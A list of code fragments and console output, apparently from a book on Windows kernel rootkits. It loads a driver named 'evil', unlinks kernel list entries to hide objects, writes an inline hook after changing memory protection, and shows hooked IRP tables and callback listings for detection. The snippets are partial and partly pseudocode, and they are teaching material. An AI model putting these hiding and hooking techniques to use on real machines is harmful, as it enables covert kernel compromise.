["```\nC:\\> sc create \"evil\" binPath=\"C:\\Users\\Public\\evil.sys\" type=kernel\n```", "```\nC:\\> sc start \"evil\"\n```", "```\nC:\\Windows\\system32> sc create \"evil\" binPath=\"C:\\Users\\Public\\evil.sys\" type=kernel\n\n[SC] CreateService SUCCESS\n\nC:\\Windows\\system32> sc start \"evil\"\n\nSERVICE_NAME: evil\nTYPE             : 1 KERNEL_DRIVER\nSTATE            : 4 RUNNING\n`--snip--`\nWIN32_EXIT_CODE  : 0 (0x0)\n`--snip--`\n```", "```\nC:\\Windows\\system32> sc start \"evil\"\n\n[SC] StartService FAILED 1275:\nThis driver has been blocked from loading\n```", "```\nvoid remove_links(PLIST_ENTRY Current) {\n\n    PLIST_ENTRY Previous, Next;\n  ❶ Previous = (Current->Blink);\n  ❷ Next = (Current->Flink);\n\n    // Loop over self (connect previous with next).\n    Previous->Flink = Next;\n    Next->Blink = Previous;\n\n    // Rewrite the current LIST_ENTRY to point to itself.\n  ❸ Current->Blink = (PLIST_ENTRY)&Current->Flink;\n  ❹ Current->Flink = (PLIST_ENTRY)&Current->Flink;\n`--snip--`\n```", "```\n// Set target memory to PAGE_READWRITE protection.\nMmProtectMdlSystemAddress(mdl, \"PAGE_READWRITE\");\n\n// Write a hook (a jump instruction) into the target function.\nRtlCopyMemory(targetAddress, sourceAddress, size);\n\n// Set the target memory back to original protections.\nMmProtectMdlSystemAddress(mdl, \"PAGE_READONLY\");\n```", "```\nIRP_MJ_CREATE              0xfffff8023674ca20   FLTMGR.SYS\nIRP_MJ_CREATE_NAMED_PIPE   0xfffff8023674ca20   FLTMGR.SYS\nIRP_MJ_CLOSE               0xfffff80236713e60   FLTMGR.SYS\nIRP_MJ_READ                0xfffff80236713e60   FLTMGR.SYS\nIRP_MJ_WRITE               0xfffff80236713e60   FLTMGR.SYS\nIRP_MJ_QUERY_INFORMATION   0xfffff80236713e60   FLTMGR.SYS\nIRP_MJ_SET_INFORMATION     0xfffff80236713e60   FLTMGR.SYS\nIRP_MJ_QUERY_EA            0xfffff80236713e60   FLTMGR.SYS\n`--snip--`\n```", "```\n0 IRP_MJ_CREATE             0xfffff80230bf1bc4   autochk.sys\n1 IRP_MJ_CREATE_NAMED_PIPE  0xfffff8023674ca20   FLTMGR.SYS\n2 IRP_MJ_CLOSE              0xfffff80236713e60   FLTMGR.SYS\n3 IRP_MJ_READ               0xfffff80236713e60   FLTMGR.SYS\n4 IRP_MJ_WRITE        \t    0xfffff80236713e60   FLTMGR.SYS\n5 IRP_MJ_QUERY_INFORMATION  0xfffff80236713e60   FLTMGR.SYS\n6 IRP_MJ_SET_INFORMATION    0xfffff80236713e60   FLTMGR.SYS\n7 IRP_MJ_QUERY_EA           0xfffff80236713e60   FLTMGR.SYS\n`--snip--`\n```", "```\nType                               Callback            Module\n--------------------------------------------------------------------\nIoRegisterShutdownNotification     0xfffff8033891e830  ntoskrnl.exe\nIoRegisterShutdownNotification     0xfffff8033b6b10c0  SgrmAgent.sys\nIoRegisterShutdownNotification     0xfffff803390cf320  ntoskrnl.exe\n`--snip--`\nPsRemoveLoadImageNotifyRoutine     0xfffff80af3afb210  ahcache.sys\nPsRemoveCreateThreadNotifyRoutine  0xfffff80336bd1060  mmcss.sys\n**PsSetCreateThreadNotifyRoutine     0xfffff6050d26ccc0  comp.sys**\nKeBugCheckCallbackListHead         0xfffff8033c13cb90  ndis.sys\nKeBugCheckCallbackListHead         0xfffff8033c59b4e0  fvevol.sys\n`--snip--`\n```", "```\n1 void RegistryCallback(..., ..., context)\n{\n  if (context)\n  {\n   ❷ if (event == CM_EVENT_REGISTRY_KEY_OPEN)\n    {\n     ❸ if (context->registryKey == \"HKEY_CURRENT_USER\\Software\\Microsoft\\\nWindows\\CurrentVersion\\evil\")\n      {\n     ❹ // Block the action.\n      }\n    }\n  }\n}\n\n5 CmRegisterCallback(RegistryCallback, &context);\n```"]